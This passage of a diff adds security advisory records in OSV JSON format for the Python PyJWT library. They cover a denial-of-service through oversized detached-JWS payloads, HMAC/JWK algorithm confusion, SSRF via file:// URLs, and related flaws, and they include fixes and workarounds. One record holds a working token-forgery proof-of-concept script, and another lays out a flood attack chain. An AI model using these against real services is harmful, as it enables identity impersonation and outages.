+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48525",
+        "PYSEC-2026-178"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-400"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T19:29:12Z",
+        "nvd_published_at": "2026-05-28T16:16:29Z",
+        "severity": "MODERATE"
+      },
+      "details": "> [!NOTE]\n> Practical impact depends on whether request body-size limits are enforced upstream (proxy/web-server/framework). Deployments with typical body-size caps (≤2 MB) bound the amplifier significantly; deployments accepting larger token inputs are more exposed.\n\nWhen verifying detached JWS tokens using the unencoded-payload option (`\"b64\": false`, RFC 7797), PyJWT performs **Base64URL decoding of the compact-serialization payload segment** *before* enforcing the detached-payload rules.\n\nFor `b64=false`, PyJWT later **discards** that decoded payload and replaces it with the caller-provided `detached_payload`. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces **CPU work + memory allocations** even if the signature is invalid.\n\nThis creates an **unauthenticated DoS** vector against any endpoint that verifies detached JWS using PyJWT.\n\n---\n\n## Affected Component(s)\n\n* `jwt/api_jws.py`\n\n  * `PyJWS.decode()` / `PyJWS.decode_complete()`\n  * `_load()` (parsing and Base64URL decoding)\n\n---\n\n## Root Cause (exact logic flaw)\n\n### What happens in the code\n\nIn `jwt/api_jws.py`, `decode_complete()` does the following (order matters):\n\n* Calls `_load(jwt)` first, which decodes the token segments\n* Only after that, checks `header.get(\"b64\")` and if `False`, it replaces `payload = detached_payload` and rebuilds the signing input\n\nThis behavior is visible in `decode_complete()`:\n\n* `_load(jwt)` happens **before** the `b64=false` handling\n* then `payload = detached_payload` and `signing_input = ... detached_payload` happens afterward ([GitHub][1])\n\nInside `_load()`, PyJWT unconditionally performs:\n\n* `payload = base64url_decode(payload_segment)`\n  This is the expensive step the attacker can amplify ([GitHub][1])\n\n### Why this becomes a vulnerability\n\nFor `b64=false` detached JWS, the payload segment in compact form is effectively **not needed** for verification in PyJWT’s own logic (since the library uses `detached_payload` as the real payload). Yet PyJWT still decodes it first, meaning:\n\n* cost is paid **even when signature is invalid**\n* the decoded bytes are **discarded**\n* attacker controls the size of this cost via token length\n\n---\n\n## Impact (evidence-driven)\n\n### Security impact\n\n* **Unauthenticated remote DoS**: decoding work happens before signature rejection → attacker does not need signing key.\n* **CPU amplification**: Base64URL decode time scales linearly with payload segment size.\n* **Memory amplification**: decoded output allocates large byte buffers (tens of MB per request).\n* **Operational impact**: request queueing / worker starvation under modest concurrency bursts.\n\n### Standards context (RFC 7797)\n\nRFC 7797 explicitly notes this option is used when payload is large and/or detached, and discusses interoperability requirements around marking it critical (“crit” with “b64”). ([IETF Datatracker][2])\n(PyJWT supports `crit` validation, but the issue here is decode order / unbounded decode of an unused segment.)\n\n---\n\n## Affected Versions\n\n* **Confirmed affected:** PyJWT **2.12.1** (tested from your local editable install and repo).\n* **Likely affected:** all versions that include detached payload support for JWS decoding, which was introduced in **2.4.0** (“Add detached payload support for JWS encoding and decoding”). ([pyjwt.readthedocs.io][3])\n\n(For GHSA, this phrasing is strong: “confirmed” + “likely since feature introduction”.)\n\n---\n\n# Threat Model \n\n### Typical real deployment\n\nA service verifies signed HTTP requests or webhooks using detached JWS:\n\n* token is provided in JSON body / query / header\n* actual payload is the HTTP request body passed as `detached_payload`\n\n### Attacker\n\n* remote unauthenticated client\n* can send requests to verify endpoint\n* does **not** need a valid signature (invalid signature still triggers the expensive decode path)\n\n### Attack chain\n\n1. Attacker crafts a JWS compact token with header containing `\"b64\": false` and `crit:[\"b64\"]`.\n2. Attacker inflates the **payload segment** (middle segment) to millions of Base64URL characters.\n3. Server calls `PyJWS.decode(...detached_payload=...)`.\n4. PyJWT decodes the inflated segment (CPU + memory).\n5. Signature is rejected afterward (401) — but resources already consumed.\n6. Repeated requests or bursts cause queueing/worker starvation → DoS.\n\n---\n\n# Proof of Concept - file names + results\n\n## PoC placement \n\n* [server_localhost.py](https://github.com/user-attachments/files/26132755/server_localhost.py)\n\n* [client_localhost.py](https://github.com/user-attachments/files/26132757/client_localhost.py)\n\n* [flood_localhost.py](https://github.com/user-attachments/files/26132760/flood_localhost.py)\n\n\n---\n\n## PoC # 1 - Localhost verification server\n\n**File:** [server_localhost.py](https://github.com/user-attachments/files/26132755/server_localhost.py)\n\n**Purpose:** real HTTP endpoint (`POST /verify`) that calls PyJWT detached verification and prints:\n`ok / time_ms / peak_bytes / token_len / error`.\n\n### Results (server console output)\n\n```text\n[+] Listening on http://127.0.0.1:8000\n[+] POST /verify  JSON: {\"token\": \"...\"}\n\n[127.0.0.1] ok=True  time_ms=0.102 peak_bytes=2624     token_len=117      err=None\n[127.0.0.1] ok=False time_ms=2.012 peak_bytes=2000983  token_len=500078   err=InvalidSignatureError\n[127.0.0.1] ok=True  time_ms=1.591 peak_bytes=2001061  token_len=500117   err=None\n\n[127.0.0.1] ok=True  time_ms=0.065 peak_bytes=2304     token_len=117      err=None\n[127.0.0.1] ok=False time_ms=7.534 peak_bytes=8000983  token_len=2000078  err=InvalidSignatureError\n[127.0.0.1] ok=True  time_ms=6.347 peak_bytes=8001061  token_len=2000117  err=None\n\n[127.0.0.1] ok=True  time_ms=0.066 peak_bytes=2304     token_len=117      err=None\n[127.0.0.1] ok=False time_ms=23.034 peak_bytes=32000983 token_len=8000078 err=InvalidSignatureError\n[127.0.0.1] ok=True  time_ms=22.097 peak_bytes=32001061 token_len=8000117 err=None\n```\n\n**Key takeaways from these results**\n\n* At **8,000,000 chars**, a single invalid-signature request still causes:\n\n  * **~23 ms** server work\n  * **~32 MB** peak allocations\n  * returns **401** (invalid signature) → attacker does not need key.\n\n---\n\n## PoC # 2 - Localhost network client\n\n**File:** [client_localhost.py](https://github.com/user-attachments/files/26132757/client_localhost.py)\n**Purpose:** generates baseline + (invalid signature) + (valid signature) tokens and sends them over HTTP to localhost server.\n\n### Results (client output)\n\n#### payload-chars = 500,000\n\n```text\n=== BASELINE (valid b64=false token) ===\nHTTP: 200\nclient_wall_ms: 6.3499...\nserver_time_ms: 0.10197...\nserver_peak_bytes: 2624\n\n=== ATTACK (INVALID signature - attacker needs no key) ===\nHTTP: 401\nclient_wall_ms: 4.1010...\nserver_time_ms: 2.01217...\nserver_peak_bytes: 2000983\nerror: InvalidSignatureError\n\n=== ATTACK (VALID signature - accepted path still wastes) ===\nHTTP: 200\nclient_wall_ms: 3.6586...\nserver_time_ms: 1.59092...\nserver_peak_bytes: 2001061\n```\n\n#### payload-chars = 2,000,000\n\n```text\n=== BASELINE ===\nHTTP: 200\nserver_time_ms: 0.06527...\nserver_peak_bytes: 2304\n\n=== ATTACK (INVALID signature) ===\nHTTP: 401\nserver_time_ms: 7.53430...\nserver_peak_bytes: 8000983\n\n=== ATTACK (VALID signature) ===\nHTTP: 200\nserver_time_ms: 6.34682...\nserver_peak_bytes: 8001061\n```\n\n#### payload-chars = 8,000,000\n\n```text\n=== BASELINE ===\nHTTP: 200\nserver_time_ms: 0.06573...\nserver_peak_bytes: 2304\n\n=== ATTACK (INVALID signature) ===\nHTTP: 401\nserver_time_ms: 23.03403...\nserver_peak_bytes: 32000983\n\n=== ATTACK (VALID signature) ===\nHTTP: 200\nserver_time_ms: 22.09702...\nserver_peak_bytes: 32001061\n```\n\n**Why this is strong evidence**\n\n* The server clearly does heavy work **before** rejecting invalid signatures.\n* The “valid signature” case shows even accepted requests waste resources due to unused payload segment.\n\n---\n\n## PoC # 3 - Localhost flood / burst concurrency\n\n**File:** [flood_localhost.py](https://github.com/user-attachments/files/26132760/flood_localhost.py)\n**Purpose:** sends **N concurrent** invalid-signature requests over HTTP to demonstrate queueing/worker starvation.\n\n### Results (your run: 20 concurrent @ 8,000,000 chars)\n\n```text\ntotal_wall_ms: 1374.5405770000616\n\n(16, 401, 1156.4504789998864, 21.350951999920653, 32000983, 'InvalidSignatureError')\n(19, 401, 1151.2852699997893, 21.208721999755653, 32000983, 'InvalidSignatureError')\n(18, 401, 1102.7211239997996, 21.685218999664357, 32000983, 'InvalidSignatureError')\n(13, 401, 1102.0718189997751, 21.26572200040755, 32000983, 'InvalidSignatureError')\n(11, 401, 1095.9345460000804, 20.586017000368884, 32000983, 'InvalidSignatureError')\n(17, 401, 1085.2552810001725, 22.893039000337012, 32000983, 'InvalidSignatureError')\n(10, 401, 1078.3629560000918, 22.737160999895423, 32000983, 'InvalidSignatureError')\n(7,  401, 1048.2011740000416, 22.476282000297942, 32000983, 'InvalidSignatureError')\n(8,  401, 378.93017700025666, 21.377330999712285, 32000983, 'InvalidSignatureError')\n(1,  401, 281.45106800002395, 21.34223099983501, 32000983, 'InvalidSignatureError')\n```\n\n**Interpretation**\n\n* Each request still costs ~**20–23 ms** server processing and **~32 MB** peak allocations.\n* But client-observed latency rises up to **~1.15 seconds** because requests queue behind each other → clear worker starvation/HoL blocking.\n* All were rejected with **401 InvalidSignatureError** → still unauthenticated.\n\n---\n\n# Fix \n\n### Goal\n\nPrevent unbounded resource consumption from an attacker-controlled payload segment that is unused in `b64=false` detached flow.\n\n### Minimal change strategy\n\nIn `_load()` (or by refactoring parse order), **do not Base64-decode `payload_segment` until after you know whether `b64=false` applies**.\n\nTwo safe options:\n\n1. **Reject non-empty payload segment when `b64=false`**\n\n   * Parse header first\n   * If `b64` is false and `payload_segment` is non-empty → raise `DecodeError` *before* decoding\n   * Then verification uses `detached_payload` only\n\n2. **Skip decoding payload segment entirely when `b64=false`**\n\n   * Keep payload segment as raw bytes or empty\n   * Use detached payload for signing input\n\nThis aligns with the idea that detached payload is the trusted payload input for verification; the compact payload segment should not become a resource amplification vector.\n\n(Implementation context: the current decode order and unconditional `base64url_decode(payload_segment)` are visible in the file and line region around `_load()` and `decode_complete()` ([GitHub][1]).)\n\n---\n\n# Workarounds\n\n* Enforce strict **max token length** at the HTTP boundary (proxy/gateway).\n* Apply rate limiting on verification endpoints.\n* If detached JWS (`b64=false`) is not needed in your app, reject tokens where header includes `\"b64\": false`.",
+      "id": "GHSA-w7vc-732c-9m39",
+      "modified": "2026-06-16T15:44:21.139278330Z",
+      "published": "2026-06-15T19:29:12Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48525"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-178.yaml"
+        }
+      ],
+      "related": [
+        "CGA-mrfj-xj9f-w374"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWT: Unauthenticated DoS via unbounded Base64URL decoding of unused payload segment in b64=false detached JWS"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/06/GHSA-xgmm-8j9v-c9wx/GHSA-xgmm-8j9v-c9wx.json"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48526",
+        "PYSEC-2026-179"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-287",
+          "CWE-347"
+        ],
+        "github_reviewed": true,
+        "github_reviewed_at": "2026-06-15T19:28:06Z",
+        "nvd_published_at": "2026-05-28T16:16:29Z",
+        "severity": "HIGH"
+      },
+      "details": "> [!NOTE]\n> Exploitation requires a verifier configured with both symmetric and asymmetric algorithms in `algorithms=[…]` and a raw-JSON JWK as the `key=` argument, both contrary to documented usage, hence the High attack-complexity rating.\n\n### Summary\nWhen the verifier is decoding JSON Web Tokens, while supporting both asymmetric and HMAC algorithms, the library does not validate use of JSON Web Keys in HMAC algorithm, allowing attacker to use the issuer public key as the secret key for HMAC algorithm.   \n\n### Details\nIn JWT algorithm confusion attack, the verifier is mistakenly use of public key to be used as the shared secret in symmetric algorithms.\nIn pyjwt case, when the verifier is supporting both HMAC with other asymmetric algorithm and mistakenly using the public key of the issuer to verify the token as demonstrated in the following example:\n  \n`jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"])) `\n\nAn attacker who specifies in the token header to use HMAC, will cause the verifier to accept the JWK as the secret key in HMAC algorithm. \nThe attacker will be able to forge JWT signed with the public key of the issuer to impersonate any user. \n\nIf we look on current protections implemented in the library, at class HMACAlgorithm:\n\n```\n  def prepare_key(self, key: str | bytes) -> bytes:\n        key_bytes = force_bytes(key)\n\n        if is_pem_format(key_bytes) or is_ssh_key(key_bytes):\n            raise InvalidKeyError(\n                \"The specified key is an asymmetric key or x509 certificate and\"\n                \" should not be used as an HMAC secret.\"\n            )\n\n        return key_bytes\n```\nWe can observe that there is a protection against this type of attacks but only when the verifier is using PEM format or SSH key to verify the token. JSON Web Keys, on the other hand will pass the validation.\n\nIn The following example:\n`jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"])) `\nThere is indeed a wrong implementation of the verifier, but a stronger protection in the library side will prevent and protect against those type of misconfiugrations. \n\nThe bypass happens only if the verifier:\n (a) allows HS* and an asymmetric algorithm in the same call and (b) passes a public-key value as key.\n\n### PoC\nPlease run the code and observe the payload printed in clear text({\"sub\":\"alice\",\"admin\":true}')\n\n```\nfrom jwt.api_jws import PyJWS\nimport json, base64, hmac, hashlib\n\ndef b64u(b): return base64.urlsafe_b64encode(b).rstrip(b\"=\")\n\n# Public RSA JWK (public by design)\nrsa_jwk_json = json.dumps({\"kty\":\"RSA\",\"n\":\"AQAB\",\"e\":\"AQAB\"})\n\n# Attacker-crafted token: flip to HS256 and choose claims\nheader  = b64u(b'{\"alg\":\"HS256\",\"typ\":\"JWT\"}')\npayload = b64u(b'{\"sub\":\"alice\",\"admin\":true}')\nsigning = header + b\".\" + payload\n\n# Sign with HMAC using the PUBLIC JWK JSON TEXT as the “secret”\nsig   = hmac.new(rsa_jwk_json.encode(), signing, hashlib.sha256).digest()\ntoken = (signing + b\".\" + b64u(sig)).decode()\n\n# Vulnerable verifier: mixed families + JWK JSON string as key\njws = PyJWS()\nprint(jws.decode(token, key=rsa_jwk_json, algorithms=[\"HS256\",\"RS256\"]))\n# -> b'{\"sub\":\"alice\",\"admin\":true}'\n```\n\n\n### Impact\nUnauthenticated token forgery → full identity/role impersonation at the resource server (authorization bypass).",
+      "id": "GHSA-xgmm-8j9v-c9wx",
+      "modified": "2026-06-16T15:44:21.766942950Z",
+      "published": "2026-06-15T19:28:06Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-xgmm-8j9v-c9wx"
+        },
+        {
+          "type": "ADVISORY",
+          "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-48526"
+        },
+        {
+          "type": "PACKAGE",
+          "url": "https://github.com/jpadilla/pyjwt"
+        },
+        {
+          "type": "WEB",
+          "url": "https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2026-179.yaml"
+        }
+      ],
+      "related": [
+        "CGA-fwg2-g6wj-67r6"
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ],
+      "summary": "PyJWT: Public-key JWK accepted as HMAC secret enables forged HS256 tokens when mixed families are allowed"
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-120.yaml"
+          },
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.12.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-32597",
+        "GHSA-752w-5fwx-jx9f"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.12.0, PyJWT does not validate the crit (Critical) Header Parameter defined in RFC 7515 §4.1.11. When a JWS token contains a crit array listing extensions that PyJWT does not understand, the library accepts the token instead of rejecting it. This violates the MUST requirement in the RFC. This vulnerability is fixed in 2.12.0.",
+      "id": "PYSEC-2026-120",
+      "modified": "2026-05-20T09:19:15.426301Z",
+      "published": "2026-03-13T19:55:09.500Z",
+      "references": [
+        {
+          "type": "WEB",
+          "url": "https://lists.debian.org/debian-lts-announce/2026/05/msg00008.html"
+        },
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
+          "type": "CVSS_V3"
+        }
+      ]
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-175.yaml"
+          },
+          "ecosystem_specific": {},
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48522",
+        "GHSA-993g-76c3-p5m4"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient passes its uri argument directly to urllib.request.urlopen() which uses Python stdlib's default OpenerDirector registering HTTPHandler, HTTPSHandler, FTPHandler, FileHandler, and DataHandler. There is currently no documented option to restrict which schemes PyJWKClient will fetch. If an application's jku URL ingestion path accepts attacker-influenced URLs (e.g., from JWT header, configuration file, OAuth flow parameter), the attacker can cause PyJWKClient to read arbitrary local files via file:// (SSRF on local filesystem), cause PyJWKClient to attempt FTP / data-URI fetches (broader SSRF surface), or forge tokens that PyJWT verifies as valid. The library does not directly return non-HTTP(S) URI contents to the attacker; the chained \"plant a JWKS to forge tokens\" scenario described in the original report requires additional application-layer flaws (attacker write access to a filesystem path, untrusted jku derivation) that this fix does not address. This vulnerability is fixed in 2.13.0.",
+      "id": "PYSEC-2026-175",
+      "modified": "2026-06-02T12:15:09.282275410Z",
+      "published": "2026-05-28T16:16:29.150Z",
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-993g-76c3-p5m4"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ]
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-176.yaml"
+          },
+          "ecosystem_specific": {},
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.9.0"
+                },
+                {
+                  "fixed": "2.12.1"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48523",
+        "GHSA-jq35-7prp-9v3f"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. From 2.9.0 to 2.12.1, there is a verifier-side algorithm allow-list bypass when jwt.decode() or jwt.decode_complete() are called with a PyJWK key. The token header alg is checked against the caller-supplied algorithms allow-list, but signature verification is performed with the algorithm bound to the PyJWK object instead of the header algorithm. An attacker who controls a registered JWK/JWKS private key can sign with a disallowed algorithm, advertise an allowed algorithm in the JWT header, and still be accepted. The issue affects the documented PyJWKClient.get_signing_key_from_jwt(...) flow. This vulnerability is fixed in 2.13.0.",
+      "id": "PYSEC-2026-176",
+      "modified": "2026-06-02T12:15:10.358230706Z",
+      "published": "2026-05-28T16:16:29.280Z",
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-jq35-7prp-9v3f"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N",
+          "type": "CVSS_V3"
+        }
+      ]
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-177.yaml"
+          },
+          "ecosystem_specific": {},
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
+            "0.1.4",
+            "0.1.5",
+            "0.1.6",
+            "0.1.7",
+            "0.1.8",
+            "0.1.9",
+            "0.2.0",
+            "0.2.1",
+            "0.2.3",
+            "0.3.0",
+            "0.3.1",
+            "0.3.2",
+            "0.4.0",
+            "0.4.1",
+            "0.4.2",
+            "0.4.3",
+            "1.0.0",
+            "1.0.1",
+            "1.1.0",
+            "1.3.0",
+            "1.4.0",
+            "1.4.1",
+            "1.4.2",
+            "1.5.0",
+            "1.5.1",
+            "1.5.2",
+            "1.5.3",
+            "1.6.0",
+            "1.6.1",
+            "1.6.3",
+            "1.6.4",
+            "1.7.0",
+            "1.7.1",
+            "2.0.0",
+            "2.0.0a1",
+            "2.0.0a2",
+            "2.0.1",
+            "2.1.0",
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.2.0",
+            "2.3.0",
+            "2.4.0",
+            "2.5.0",
+            "2.6.0",
+            "2.7.0",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48524",
+        "GHSA-fhv5-28vv-h8m8"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. Prior to 2.13.0, PyJWKClient.get_signing_key() forces a fresh HTTP request to the JWKS endpoint for every JWT with an unknown kid value, with no rate limiting. Since kid comes from the unverified token header, an attacker can trigger unlimited outbound requests. The vulnerability surfaces only when a JWKS fetch fails; an attacker can attempt to provoke that with sustained unknown-kid traffic, but the outcome depends on upstream JWKS-endpoint behavior (rate limiting, transient errors) which is beyond the attacker's control. This vulnerability is fixed in 2.13.0.",
+      "id": "PYSEC-2026-177",
+      "modified": "2026-06-02T12:15:10.363704191Z",
+      "published": "2026-05-28T16:16:29.403Z",
+      "references": [
+        {
+          "type": "ADVISORY",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-fhv5-28vv-h8m8"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ]
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-178.yaml"
+          },
+          "ecosystem_specific": {},
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "2.8.0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "2.10.0",
+            "2.10.1",
+            "2.11.0",
+            "2.12.0",
+            "2.12.1",
+            "2.8.0",
+            "2.9.0"
+          ]
+        }
+      ],
+      "aliases": [
+        "CVE-2026-48525",
+        "GHSA-w7vc-732c-9m39"
+      ],
+      "details": "PyJWT is a JSON Web Token implementation in Python. From 2.8.0 to 2.12.1, when verifying detached JWS tokens using the unencoded-payload option (\"b64\": false, RFC 7797), PyJWT performs Base64URL decoding of the compact-serialization payload segment before enforcing the detached-payload rules. For b64=false, PyJWT later discards that decoded payload and replaces it with the caller-provided detached_payload. In practice, this turns the middle segment into an attacker-controlled “work amplifier”: a remote client can supply an arbitrarily large Base64URL payload segment that forces CPU work + memory allocations even if the signature is invalid. This creates an unauthenticated DoS vector against any endpoint that verifies detached JWS using PyJWT. This vulnerability is fixed in 2.13.0.",
+      "id": "PYSEC-2026-178",
+      "modified": "2026-06-02T12:15:10.739334903Z",
+      "published": "2026-05-28T16:16:29.533Z",
+      "references": [
+        {
+          "type": "EVIDENCE",
+          "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-w7vc-732c-9m39"
+        }
+      ],
+      "schema_version": "1.7.5",
+      "severity": [
+        {
+          "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "type": "CVSS_V3"
+        }
+      ]
+    },
+    {
+      "affected": [
+        {
+          "database_specific": {
+            "source": "https://github.com/pypa/advisory-database/blob/main/vulns/pyjwt/PYSEC-2026-179.yaml"
+          },
+          "ecosystem_specific": {},
+          "package": {
+            "ecosystem": "PyPI",
+            "name": "pyjwt",
+            "purl": "pkg:pypi/pyjwt"
+          },
+          "ranges": [
+            {
+              "events": [
+                {
+                  "introduced": "0"
+                },
+                {
+                  "fixed": "2.13.0"
+                }
+              ],
+              "type": "ECOSYSTEM"
+            }
+          ],
+          "versions": [
+            "0.1.1",
+            "0.1.2",
+            "0.1.3",
